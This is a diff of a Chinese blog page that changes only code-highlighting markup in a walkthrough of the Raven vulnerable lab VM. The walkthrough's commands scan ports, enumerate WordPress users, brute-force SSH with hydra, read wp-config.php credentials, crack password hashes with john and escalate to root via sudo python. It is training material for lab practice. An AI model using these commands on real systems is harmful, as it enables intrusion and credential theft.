@@ -580,21 +580,6 @@
         
  <!-- prismjs 代码高亮 -->
  
-    
-    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
-    
-        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
-    
-
-    <style>
-        pre[class*="language-"] {
-            overflow-y: hidden;
-        }
-        .line-numbers .line-numbers-rows {
-            border: none;
-        }
-    </style>
-  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -673,19 +658,19 @@
 <li>192.168.101.254 DHCP服务器</li>
 </ul>
 </blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover <span class="token parameter variable">-r</span> <span class="token number">192.168</span>.101.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141708005.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ping</span> <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626141742326.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <ul>
 <li>通过masscan四层发现目标主机开放端口</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan -p0-65535 <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>masscan：高速端口扫描工具。参数如下：</p>
@@ -700,7 +685,7 @@
 <p>目标主机开启了80web服务端口，40695端口，111端口</p>
 <ul>
 <li><p>扫描目标端口服务</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> -p- <span class="token parameter variable">-sC</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-P0</span> <span class="token number">192.168</span>.101.135 <span class="token parameter variable">-oN</span> nmap.A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.135 -oN nmap.A</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <ul>
@@ -726,13 +711,13 @@
 </li>
 </ul>
 <p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> vuln <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <hr>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142416004.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>可以看到有很多现成的CVE可以用</p>
 <p>对网站进行指纹识别：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142445620.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>没有有效的web服务信息</p>
@@ -751,7 +736,7 @@
 <ul>
 <li>目录扫描：</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb <span class="token number">192.168</span>.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb 192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626142852924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>目标网站存在vendor目录，访问一下，发现存在敏感目录遍历</p>
@@ -773,36 +758,34 @@
 <ul>
 <li>编辑hosts文件，使raven.local解析到靶机ip，写完之后清除一下dns缓存</li>
 </ul>
-<pre class="line-numbers language-none"><code class="language-none">192.168.101.135 raven.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.101.135 raven.local</span><br></pre></td></tr></table></figure>
 
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfig /flushdns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /flushdns</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153057034.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153223672.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <h3 id="2-漏洞扫描"><a href="#2-漏洞扫描" class="headerlink" title="2. 漏洞扫描"></a>2. 漏洞扫描</h3><h4 id="WPscan工具"><a href="#WPscan工具" class="headerlink" title="WPscan工具"></a>WPscan工具</h4><p>用WPscan来探测WordPress的漏洞，暴力枚举用户名：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.101.135/wordpress/ <span class="token parameter variable">-eu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.101.135/wordpress/ -eu</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626153736259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>爆破到了两个用户名，分别是：<code>michael</code>	<code>steven</code></p>
 <h4 id="hydra工具暴力破解"><a href="#hydra工具暴力破解" class="headerlink" title="hydra工具暴力破解"></a>hydra工具暴力破解</h4><p>把这两个用户名写入user.txt，用hydra进行密码爆破登录SSH:</p>
 <p>kali本身有自带的密码字典：rockyou</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154210867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">gzip</span> <span class="token parameter variable">-d</span> /usr/share/wordlists/rockyou.txt.gz
-<span class="token function">cp</span> /usr/share/wordlists/rockyou.txt pass
-hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> pass <span class="token number">192.168</span>.101.135 <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line"><span class="built_in">cp</span> /usr/share/wordlists/rockyou.txt pass</span><br><span class="line">hydra -L user.txt -P pass 192.168.101.135 ssh</span><br></pre></td></tr></table></figure>
 
 
 
 <p>ssh的用户michael密码为michael：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626154904128.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h4 id="尝试进行ssh登录："><a href="#尝试进行ssh登录：" class="headerlink" title="尝试进行ssh登录："></a>尝试进行ssh登录：</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> michael@192.168.101.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="尝试进行ssh登录："><a href="#尝试进行ssh登录：" class="headerlink" title="尝试进行ssh登录："></a>尝试进行ssh登录：</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh michael@192.168.101.135</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155252966.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>ssh登录成功，获得低权限shell</p>
 <h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h3><ul>
 <li>find命令寻找flag2:</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> *flag* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag* 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <blockquote>
 <p>这个命令的作用是在Linux系统中查找文件名中包含“flag”字符串的文件，并将结果输出到控制台。</p>
@@ -815,16 +798,15 @@ hydra <span class="token parameter variable">-L</span> user.txt <span class="tok
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626155524561.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>找到flag2:&#x3D;&#x3D;flag2{fc3fd58dcdad9ab23faca6e9a36e581c}&#x3D;&#x3D;</p>
 <h4 id="登录Mysql"><a href="#登录Mysql" class="headerlink" title="登录Mysql"></a>登录Mysql</h4><p>查看Mysql是否在运行</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-ef</span> <span class="token operator">|</span> <span class="token function">grep</span> mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160053324.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>切换到wordpress目录，发现config配置文件：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /var/www/html/wordpress
-<span class="token function">cat</span> wp-config.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/wordpress</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160527025.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>找到数据库账号root，密码R@v3nSecurity。Mysql登录</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql <span class="token parameter variable">-u</span> root <span class="token parameter variable">-p</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626160628125.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>查看mysql数据库：</p>
@@ -838,8 +820,7 @@ hydra <span class="token parameter variable">-L</span> user.txt <span class="tok
 <p>用户名分别为<code>michael</code>和<code>steven</code></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626161341869.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>密码加密后如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
-steven:$P$Bk3VD9jsxx&#x2F;loJoqNsURgHiaB23j7W&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0</span><br><span class="line">steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</span><br></pre></td></tr></table></figure>
 
 
 
@@ -847,22 +828,21 @@ steven:$P$Bk3VD9jsxx&#x2F;loJoqNsURgHiaB23j7W&#x2F;<span aria-hidden="true" clas
 <li>john解密：</li>
 </ul>
 <p>把上面<code>steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</code>写进1.txt，使用john工具解密：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token number">1</span>.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john 1.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162424167.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>找到steven密码pink84</p>
 <h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>使用<strong>python pty提权</strong></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>michael用户进行python提权时，由于michael用户没有被赋予sudo执行python的权限，所以提权失败，并且该事件还被记录了</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162718424.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>ssh登录steven之后再尝试提权：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> steven@192.168.101.135
-<span class="token function">sudo</span> python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash");'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh steven@192.168.101.135</span><br><span class="line">sudo python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626162930601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>steven是具有python sudo权限的，在sudoers里存在：</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steven <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steven ALL=(ALL) NOPASSWD: /usr/bin/python</span><br></pre></td></tr></table></figure>
 
 <p>授予普通用户以root权限执行Python脚本（实战用不了一点）</p>
 <p>用find命令或者直接找，在~目录下也能找到flag4</p>
